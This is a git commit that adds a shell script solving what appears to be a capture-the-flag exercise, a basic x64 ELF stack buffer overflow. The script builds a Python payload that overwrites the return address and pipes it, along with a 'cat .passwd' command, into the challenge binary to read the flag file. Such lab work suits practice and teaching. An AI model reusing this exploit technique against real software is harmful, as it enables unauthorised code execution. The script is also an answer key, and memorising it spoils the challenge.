0802267cbbe212c8e965767b6be76c2f3c2a66e8
udf <tabhooked@gmail.com>
2019-12-01 15:26:13 +0200

    Add 05

---
+++ 05 ELF x64 - Stack buffer overflow basic/commands.sh
@@ -0,0 +1,18 @@
+# ssh ... < commands.sh
+
+cat << 'EOF' > /tmp/ch35_data.py
+import struct
+import sys
+
+s = bytearray(b'V' * 255) + b'\x00' #buffer
+s += b'W' * 16 #padding for two ints
+# leave pops this into rbp, but we don't care
+rbp = struct.pack('<Q', 0x0)
+# ret pops this into rip
+rip = struct.pack('<Q', 0x4005e7)
+s += rbp + rip
+
+sys.stdout.buffer.write(s)
+EOF
+
+(python3 /tmp/ch35_data.py; echo; cat <<< 'cat .passwd') | ./ch35
